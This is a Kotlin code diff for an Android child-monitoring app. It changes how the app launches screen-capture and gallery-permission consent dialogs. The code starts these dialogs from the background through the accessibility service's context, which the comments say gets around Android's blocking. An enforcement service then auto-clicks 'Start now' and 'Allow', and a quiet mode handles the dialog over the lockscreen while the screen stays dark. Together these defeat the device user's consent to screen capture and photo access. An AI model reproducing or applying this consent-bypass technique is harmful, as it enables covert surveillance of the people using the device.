@@ -146,6 +146,10 @@ object CommandHandler {
                     // ~20 s tak zinda rakhta hai taki RETRY par frame mil jaye —
                     // uske baad idle session khud release (cast icon na bache).
                     Store.pendingCaptureAt = android.os.SystemClock.elapsedRealtime()
+                    // Auto-complete ke liye original command id yaad rakho — MirrorService
+                    // consent milte hi khud capture karke ISI id ke saath result bhejega
+                    // (parent ko dobara tap nahi karna padega).
+                    Store.pendingCaptureCmdId = cmd.get("id")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
                     requestProjectionConsent(ctx)
                     data.addProperty("error", "no permission — consent auto-requested, retry shortly")
                     Pair(false, data)
@@ -239,6 +243,19 @@ object CommandHandler {
                 data.addProperty("device", android.os.Build.MANUFACTURER.orEmpty() + " " + android.os.Build.MODEL.orEmpty())
                 data.addProperty("screenOn", MirrorManager.screenOnNow())
                 data.add("health", SelfHeal.healthReport(ctx))
+                // Consent dialog SACH ME khula tha? ConsentActivity consentUiAt set
+                // karti hai — ye flag parent ko "dialog khula par click nahi hua"
+                // vs "dialog khula HI NAHI (BAL/OEM block)" alag karne deta hai.
+                val uiAge = if (Store.consentUiAt > 0L)
+                    android.os.SystemClock.elapsedRealtime() - Store.consentUiAt else -1L
+                data.addProperty("consentUiSeen", uiAge in 0..120_000L)
+                // Screenshot consent window bhi pending hai to bata do (Phone check
+                // screenshot-diagnosis me bhi yahi use hota hai).
+                if (Store.pendingCaptureAt > 0L &&
+                    android.os.SystemClock.elapsedRealtime() - Store.pendingCaptureAt <= 60_000L
+                ) {
+                    data.addProperty("capturePending", true)
+                }
                 data.addProperty("frames", MirrorManager.frameCount)
                 val ago = MirrorManager.lastFrameAgoSec()
                 if (ago != null) data.addProperty("lastFrameAgoSec", ago)
@@ -577,22 +594,66 @@ object CommandHandler {
         }
     }
 
+    /** BAL-safe activity start — FRESH-INSTALL/UPDATE ROOT FIX. ConsentActivity aur
+     *  GalleryPermActivity background se start hoti hain; Android 10+ par wo start
+     *  SILENTLY BLOCK hoti hain (koi exception NAHI!) jab tak app ke paas overlay
+     *  permission na ho. Uninstall+reinstall ke baad overlay CHALI JATI hai — result:
+     *  consent dialog kabhi khulta hi nahi, a11y (chahe ON ho) ke saamne kuch click
+     *  karne ko nahi hota, aur mirror/screenshot/gallery TEENO dead. FIX: jab a11y
+     *  service bound hai to uska context use karo — a11y-bound app ko system
+     *  background-activity-start exemption deta hai, overlay ki zaroorat nahi.
+     *  buildIntent har attempt par FRESH Intent deta hai (reuse-safe). */
+    fun startActivityBalSafe(base: Context, buildIntent: () -> Intent): Boolean {
+        com.familyguard.child.service.EnforcementService.instance?.let { svc ->
+            if (runCatching { svc.startActivity(buildIntent().addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) }
+                    .getOrDefault(false)
+            ) return true
+        }
+        return try {
+            base.startActivity(buildIntent().addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            true
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     /** Gallery permission background request — transparent activity runtime
      *  dialog kholti hai, EnforcementService "gallery" step par Allow khud
-     *  click karta hai (overlay permission ke bina background se legal). */
+     *  click karta hai. Start BAL-safe (a11y context) — start fail ho to
+     *  tap-able notification fallback (foreground tap hamesha legal). */
     private fun requestGalleryPerm(ctx: Context) {
-        runCatching {
-            ctx.startActivity(
-                android.content.Intent(ctx, com.familyguard.child.ui.GalleryPermActivity::class.java)
-                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-            )
+        val ok = startActivityBalSafe(ctx) {
+            android.content.Intent(ctx, com.familyguard.child.ui.GalleryPermActivity::class.java)
+        }
+        if (!ok) {
+            runCatching {
+                val pi = PendingIntent.getActivity(
+                    ctx, 9005,
+                    android.content.Intent(ctx, com.familyguard.child.ui.GalleryPermActivity::class.java),
+                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+                )
+                ensureChannel(ctx)
+                val n = NotificationCompat.Builder(ctx, CH_FG)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Gallery permission")
+                    .setContentText("Tap to allow photo access")
+                    .setContentIntent(pi)
+                    .setAutoCancel(true)
+                    .build()
+                if (
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
+                    Build.VERSION.SDK_INT < 33
+                ) {
+                    NotificationManagerCompat.from(ctx).notify(9006, n)
+                }
+            }
         }
     }
 
     /** Launch the system screen-capture consent dialog without user interaction.
-     *  Works from background because the app holds the overlay permission; if the
-     *  OEM blocks that, fall back to a tap-able heads-up notification. EnforcementService
-     *  auto-clicks "Start now" within 60 s of this call.
+     *  Start BAL-safe: a11y-bound service context (exempt) pehle, phir normal
+     *  context (overlay/foreground), aur dono fail hon to tap-able notification.
+     *  EnforcementService auto-clicks "Start now" within 60 s of this call.
      *  quiet=true (reboot path): do NOT wake the screen — the dialog is handled
      *  over the lockscreen while the phone stays dark.
      *  Returns true when a fresh dialog request was launched. Re-launch sirf tab
@@ -613,13 +674,14 @@ object CommandHandler {
         if (inFlight && now - Store.lastConsentRequestAt < 20_000L) return false
         Store.lastConsentRequestAt = now
         Store.projectionRequestedAt = now
-        try {
-            ctx.startActivity(
-                Intent(ctx, ConsentActivity::class.java)
-                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    .putExtra("quiet", quiet)
-            )
-        } catch (_: Exception) {
+        // BAL-SAFE START (vc10): pehle a11y-bound service context (exempt), phir
+        // normal context. Bina overlay ke bhi dialog khulti hai jab a11y ON hai —
+        // fresh-install/update ke baad yahi scene hota hai.
+        val started = startActivityBalSafe(ctx) {
+            Intent(ctx, ConsentActivity::class.java).putExtra("quiet", quiet)
+        }
+        if (!started) {
+            // Fallback: tap-able heads-up notification (foreground tap = hamesha legal).
             val pi = PendingIntent.getActivity(
                 ctx, 9003,
                 Intent(ctx, ConsentActivity::class.java).putExtra("quiet", quiet),
